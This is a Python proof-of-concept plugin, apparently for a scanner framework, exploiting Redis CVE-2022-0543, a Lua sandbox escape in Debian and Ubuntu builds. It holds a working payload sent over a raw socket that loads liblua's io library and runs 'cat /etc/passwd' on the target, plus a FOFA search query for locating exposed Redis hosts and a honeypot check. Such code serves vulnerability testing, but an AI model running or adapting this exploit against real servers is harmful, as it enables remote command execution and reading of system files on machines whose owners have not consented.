# coding:utf-8  
import socket
from lib.core.common import url_handle, get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3

urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
        略  
        """,  # POC描述，写更新描述，没有就不写

        "name": "Redis Lua 沙箱逃逸和远程代码执行 (CVE-2022-0543)",  # 漏洞名称
        "VulnID": "CVE-2022-0543",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "Redis",  # 漏洞应用名称
        "AppVersion": """
            2.2 <= redis < 5.0.13
            2.2 <= redis < 6.0.15
            2.2 <= redis < 6.2.5
        """,  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
            Redis 存在代码注入漏洞，攻击者可利用该漏洞远程执行代码。
            Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。
        """,  # 漏洞简要描述

        "fofa-dork": """
            app="redis"
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        ip = self.host
        port = int(self.port)

        ss = socket.socket()
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            ss.settimeout(10)
            ss.connect((ip, port))
            ss.send(
                'eval \'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /etc/passwd", "r"); local res = f:read("*a"); f:close(); return res\' 0 \r\n'.encode())
            data = ss.recv(10240).decode()
            if "root:/root" in data:  # req.status_code == 200 and :
                vuln = [True, data]
            else:
                vuln = [False, data]
        except Exception as e:
            raise e
        finally:
            ss.close()

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        return self._verify()
